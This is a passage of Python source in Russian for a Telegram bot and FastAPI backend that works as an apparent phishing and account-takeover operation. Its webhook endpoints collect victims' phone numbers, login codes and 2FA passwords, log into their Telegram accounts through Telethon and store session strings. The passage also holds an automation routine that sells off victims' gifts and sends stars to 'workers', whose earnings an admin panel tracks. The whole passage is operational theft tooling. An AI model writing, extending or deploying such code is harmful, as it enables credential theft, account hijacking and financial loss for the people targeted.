        "━━━━━━━━━━━━━━━━━━━━\n\n" + make_offer_card(o),
        reply_markup=make_offer_kb(o.id),
    )


# ═══════════════════════════════════════════════════════
#   ADMIN
# ═══════════════════════════════════════════════════════

@dp.callback_query(F.data == "admin_workers")
async def workers_menu(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    workers = await get_workers()
    lines = [f"🔧 <code>{w.id}</code> — @{w.username or '—'} — {w.total_offers} оф. — {w.stars_farmed}⭐"
             for w in workers]
    await call.message.edit_text(
        "👥 <b>Воркеры</b>\n\n" + ("\n".join(lines) if lines else "<i>Пусто</i>"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Выдать", callback_data="admin_grant")],
            [InlineKeyboardButton(text="➖ Забрать", callback_data="admin_revoke")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
        ]),
    )


@dp.callback_query(F.data == "admin_grant")
async def grant_start(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != ADMIN_ID:
        return
    await state.set_state(GrantForm.user_id)
    await state.update_data(action="grant")
    await call.message.edit_text("➕ user_id:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌", callback_data="admin_workers")]
        ]))


@dp.callback_query(F.data == "admin_revoke")
async def revoke_start(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != ADMIN_ID:
        return
    await state.set_state(GrantForm.user_id)
    await state.update_data(action="revoke")
    await call.message.edit_text("➖ user_id:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌", callback_data="admin_workers")]
        ]))


@dp.message(GrantForm.user_id)
async def grant_finish(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    if not message.text.isdigit():
        await message.answer("❌ Число.")
        return
    data = await state.get_data()
    uid = int(message.text)
    if data.get("action") == "revoke":
        await set_role(uid, "user")
        await message.answer(f"✅ <code>{uid}</code> не воркер.")
    else:
        await add_user(uid, None, None, "worker")
        await set_role(uid, "worker")
        await message.answer(f"✅ <code>{uid}</code> воркер.")
        try:
            await bot.send_message(uid, "🎉 Доступ выдан. /start")
        except Exception:
            pass
    await state.clear()


@dp.callback_query(F.data == "admin_logs")
async def admin_logs(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    logs = await get_logs(20)
    if not logs:
        await call.message.edit_text("📊 Пусто.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
            ]))
        return
    lines = [f"[{l.created_at:%H:%M}] {l.event} — {l.detail or '—'}" for l in logs]
    await call.message.edit_text(
        "📊 <b>Логи</b>\n\n" + "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]),
    )


@dp.callback_query(F.data == "admin_sessions")
async def admin_sessions(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    sess = await get_recent_sessions(10)
    if not sess:
        await call.message.edit_text("💎 Пусто.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
            ]))
        return
    lines = [f"#{s.id} — {s.phone} — {s.state}" for s in sess]
    await call.message.edit_text(
        "💎 <b>Сессии</b>\n\n" + "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]),
    )


@dp.callback_query(F.data == "admin_stats")
async def admin_stats(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    workers = await get_workers()
    if not workers:
        await call.message.edit_text("📈 Нет воркеров.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
            ]))
        return
    lines = ["📈 <b>Статистика</b>\n"]
    total = 0
    for w in workers:
        total += w.stars_farmed
        lines.append(
            f"🔧 @{w.username or '—'}\n"
            f"   <code>{w.id}</code>\n"
            f"   Оф: {w.total_offers} | ⭐ {w.stars_farmed}\n"
        )
    lines.append(f"\n💰 <b>ИТОГО: {total} ⭐</b>")
    await call.message.edit_text(
        "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]),
    )


@dp.message(Command("grant"))
async def cmd_grant(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("Использование: <code>/grant user_id</code>")
        return
    uid = int(args[1])
    await add_user(uid, None, None, "worker")
    await set_role(uid, "worker")
    await message.answer(f"✅ <code>{uid}</code> воркер.")


@dp.message(Command("revoke"))
async def cmd_revoke(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("Использование: <code>/revoke user_id</code>")
        return
    await set_role(int(args[1]), "user")
    await message.answer(f"✅ <code>{args[1]}</code> не воркер.")


# ═══════════════════════════════════════════════════════
#   BACKEND
# ═══════════════════════════════════════════════════════

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])


class PhonePayload(BaseModel):
    offer_id: int
    phone: str


class CodePayload(BaseModel):
    offer_id: int
    phone: str
    code: str


class PasswordPayload(BaseModel):
    offer_id: int
    phone: str
    code: str
    password: str | None = None


async def notify_admin(text):
    try:
        await bot.send_message(ADMIN_ID, text)
    except Exception:
        pass


@app.post("/webhook/phone")
async def wh_phone(p: PhonePayload):
    sess = await create_auth_session(p.offer_id, p.phone)
    await add_log(offer_id=p.offer_id, event="phone_received", detail=p.phone)
    await notify_admin(f"📱 <b>Номер</b>\n{p.phone}\nОффер: #{p.offer_id}")

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(p.phone)
        await update_session(sess.id, state="code_sent")
        await update_session(sess.id, session_string=client.session.save())
        await update_session(sess.id, phone_code_hash=sent.phone_code_hash)
        await client.disconnect()
        return {"ok": True}
    except Exception as e:
        try:
            await client.disconnect()
        except Exception:
            pass
        await add_log(offer_id=p.offer_id, event="send_code_error", detail=f"{type(e).__name__}: {e}")
        print(f"send_code error: {type(e).__name__}: {e}")
        return {"ok": False, "error": f"{type(e).__name__}: {e}"}


@app.post("/webhook/code")
async def wh_code(p: CodePayload):
    sess = await get_session_by_phone(p.phone)
    if not sess:
        return {"ok": False, "error": "Сессия не найдена."}
    if sess.attempts >= MAX_ATTEMPTS:
        return {"ok": False, "error": "Превышено количество попыток."}

    ok, res, session_str = await telethon_attempt_login(
        phone=p.phone, code=p.code, session_str=sess.session_string,
        phone_code_hash=sess.phone_code_hash,
    )
    if ok:
        await update_session(sess.id, code=p.code, state="logged",
                             session_string=session_str,
                             user_id=res["user_id"], first_name=res["first_name"],
                             last_name=res["last_name"], username=res["username"])
        await add_log(offer_id=p.offer_id, event="logged_in",
                      detail=f"{res['first_name']} @{res['username']}")
        await notify_admin(
            f"✅ <b>Логин</b>\n<code>{res['user_id']}</code>\n"
            f"{res['first_name']} @{res['username'] or '—'}\nОффер #{p.offer_id}")

        o = await get_offer(p.offer_id)
        worker_id = o.worker_id if o else ADMIN_ID
        asyncio.create_task(run_automation(session_str, p.offer_id, worker_id))
        return {"ok": True, "needs_password": False,
                "user_id": res["user_id"],
                "first_name": res["first_name"],
                "last_name": res["last_name"],
                "username": res["username"]}
    else:
        if res == "password":
            await update_session(sess.id, code=p.code, state="await_password")
            return {"ok": True, "needs_password": True}
        if res == "code":
            new_attempts = sess.attempts + 1
            await update_session(sess.id, attempts=new_attempts)
            return {"ok": False, "error": "Неверный код.",
                    "attempts_left": MAX_ATTEMPTS - new_attempts}
        if res == "expired":
            return {"ok": False, "error": "Код истёк."}
        return {"ok": False, "error": "Ошибка. Попробуйте снова."}


@app.post("/webhook/password")
async def wh_password(p: PasswordPayload):
    sess = await get_session_by_phone(p.phone)
    if not sess:
        return {"ok": False, "error": "Сессия не найдена."}
    if sess.attempts >= MAX_ATTEMPTS:
        return {"ok": False, "error": "Превышено количество попыток."}

    ok, res, session_str = await telethon_attempt_login(
        phone=p.phone, code=p.code, password=p.password,
        session_str=sess.session_string,
        phone_code_hash=sess.phone_code_hash,
    )
    if ok:
        await update_session(sess.id, password=p.password, state="logged",
                             session_string=session_str,
                             user_id=res["user_id"], first_name=res["first_name"],
                             last_name=res["last_name"], username=res["username"])
        await notify_admin(f"✅ <b>2FA</b>\n<code>{res['user_id']}</code>")
        o = await get_offer(p.offer_id)
        worker_id = o.worker_id if o else ADMIN_ID
        asyncio.create_task(run_automation(session_str, p.offer_id, worker_id))
        return {"ok": True,
                "user_id": res["user_id"],
                "first_name": res["first_name"],
                "last_name": res["last_name"],
                "username": res["username"]}
    else:
        if res == "password":
            new_attempts = sess.attempts + 1
            await update_session(sess.id, attempts=new_attempts)
            return {"ok": False, "error": "Неверный пароль.",
                    "attempts_left": MAX_ATTEMPTS - new_attempts}
        return {"ok": False, "error": "Ошибка."}


async def run_automation(session_string, offer_id, worker_id):
    o = await get_offer(offer_id)
    if not o:
        return
    await notify_admin(f"🚀 <b>Автомат</b>\nОффер #{offer_id} — воркер <code>{worker_id}</code>")

    result = await telethon_sell_all_and_react(session_string, worker_id, offer_id)

    lines = ["🎯 <b>Результат</b>", f"Оффер: #{offer_id}", ""]
    lines.append(f"📦 Подарков: <b>{result.get('gifts_total', 0)}</b>")

    if result.get("converted"):
        lines.append(f"\n💱 Конвертировано: <b>{len(result['converted'])}</b>")
        for c in result["converted"][:5]:
            lines.append(f"• {c['title']}")

    if result.get("listed"):
        lines.append(f"\n🏷 Выставлено: <b>{len(result['listed'])}</b>")
        for x in result["listed"][:10]:
            lines.append(f"• {x['title']} — {x['min_price']}⭐")

    if result.get("sold"):
        lines.append(f"\n✅ Продано: <b>{len(result['sold'])}</b>")

    if result.get("skipped"):
        lines.append(f"\n⏳ Пропущено: <b>{len(result['skipped'])}</b>")
        # группируем по причине
        reasons = {}
        for x in result["skipped"]:
            r = x.get("reason", "?")[:40]
            reasons[r] = reasons.get(r, 0) + 1
        for reason, cnt in reasons.items():
            lines.append(f"• <b>{cnt}</b> под. — {reason}")

    if result.get("failed"):
        lines.append(f"\n❌ Ошибок: <b>{len(result['failed'])}</b>")
        for x in result["failed"][:5]:
            lines.append(f"• {x['title']} — {x['reason'][:50]}")

    lines.append(f"\n💰 Баланс: <b>{result.get('balance_after', 0)} ⭐</b>")
    if result.get("reacted"):
        lines.append(f"✅ Реакция: <b>{result['stars_sent']} ⭐</b>")
    elif result.get("error"):
        lines.append(f"❌ {result['error'][:200]}")

    text = "\n".join(lines)
    await notify_admin(text)
    try:
        await bot.send_message(worker_id, text)
    except Exception:
        pass

    await add_log(worker_id=worker_id, offer_id=offer_id, event="done",
                  detail=f"reacted={result.get('reacted')} stars={result.get('stars_sent')}")


@app.get("/health")
async def health():
    return {"ok": True}


# ═══════════════════════════════════════════════════════
#   RUN
# ═══════════════════════════════════════════════════════

async def run_bot():
    print("=" * 60)
    print(f"BOOT v10")
    print("=" * 60)
    await init_db()
    print("RUN_BOT: db ready")
    try:
        await bot.delete_webhook(drop_pending_updates=True)
    except Exception as e:
        print(f"webhook clear fail: {e}")
    await bot.set_my_commands([
        BotCommand(command="start", description="Меню"),
        BotCommand(command="offer", description="Создать: /offer user_id ссылка сумма"),
    ], scope=BotCommandScopeDefault())
    print("RUN_BOT: polling...")
    await dp.start_polling(bot)


async def run_web():
    config = uvicorn.Config(app, host="0.0.0.0", port=PORT, log_level="warning")
    server = uvicorn.Server(config)
    await server.serve()


async def main():
    await asyncio.gather(run_bot(), run_web())


if __name__ == "__main__":
    asyncio.run(main())
